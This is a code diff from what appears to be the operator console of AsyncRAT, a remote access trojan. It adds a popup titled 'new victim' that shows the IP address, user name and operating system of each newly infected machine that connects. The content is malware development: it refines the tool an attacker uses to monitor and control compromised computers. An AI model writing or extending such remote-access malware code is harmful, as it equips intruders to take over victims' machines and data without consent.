@@ -4,6 +4,7 @@ using AsyncRAT_Sharp.Sockets;
 using cGeoIp;
 using System.Drawing;
 using System.Windows.Forms;
+using Tulpep.NotificationWindow;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
@@ -42,9 +43,15 @@ namespace AsyncRAT_Sharp.Handle_Packet
 
                         if (Properties.Settings.Default.Notification == true)
                         {
-                            Program.form1.notifyIcon1.BalloonTipText = $@"Connected 
-{client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} : {client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]}";
-                            Program.form1.notifyIcon1.ShowBalloonTip(100);
+                            PopupNotifier PN = new PopupNotifier();
+                            PN.TitleText = "new victim";
+                            PN.Image = AsyncRAT_Sharp.Properties.Resources.arrive;
+                            PN.ImageSize = new Size(69, 68);
+                            PN.ContentText = "IP : " + string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]) + "\n" +
+                                "User : " + unpack_msgpack.ForcePathObject("User").AsString + "\n" +
+                                "OS : " + unpack_msgpack.ForcePathObject("OS").AsString;
+                            PN.Size = new Size(225, 104);
+                            PN.Popup();
                         }
                     }));
                     lock (Settings.Online)
